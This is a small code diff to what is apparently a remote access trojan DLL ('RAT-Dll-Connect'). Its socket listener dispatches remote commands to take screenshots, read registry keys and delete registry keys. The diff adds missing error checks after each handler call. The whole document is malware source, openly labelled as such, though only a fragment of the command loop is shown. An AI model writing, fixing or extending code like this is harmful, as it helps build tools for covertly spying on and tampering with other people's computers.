@@ -168,6 +168,7 @@ INT startListen()
             else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
             {
                 status = handleScreenshot(clientSock);
+                if (status != SUCCESS)
                 {
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleScreenshot %d\n", status);
                     OutputDebugStringA(msgBuf);
@@ -180,6 +181,7 @@ INT startListen()
             else if (strcmp((const char*)&recvBuf, REGREAD) == 0)
             {
                 status = handleRegRead(clientSock);
+                if (status != SUCCESS)
                 {
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleRegRead %d\n", status);
                     OutputDebugStringA(msgBuf);
@@ -192,6 +194,7 @@ INT startListen()
             else if (strcmp((const char*)&recvBuf, REGDELETE) == 0)
             {
                 status = handleRegDelete(clientSock);
+                if (status != SUCCESS)
                 {
                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleRegDelete %d\n", status);
                     OutputDebugStringA(msgBuf);
